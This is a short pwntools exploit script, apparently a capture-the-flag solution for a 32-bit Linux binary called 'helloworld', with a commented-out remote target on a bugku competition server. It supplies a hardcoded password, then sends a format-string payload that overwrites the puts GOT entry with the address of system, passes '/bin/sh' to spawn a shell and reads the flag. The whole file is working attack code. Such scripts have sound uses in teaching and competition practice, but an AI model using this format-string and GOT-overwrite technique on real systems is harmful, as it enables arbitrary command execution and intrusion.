from pwn import *

context.update( os = 'linux', arch = "i386",timeout = 1)
p = process("./helloworld")


#p = remote("192-168-1-25.awd.bugku.cn","9999")

p.sendlineafter("please input password:","123456")

puts_got = 0x0804A028
system = 0x8048670

payload = fmtstr_payload(18,{puts_got:system})

p.sendlineafter("secret name:",payload)

pause()

p.sendlineafter("secret text:","/bin/sh\x00")
p.sendline("cat flag")


p.interactive()
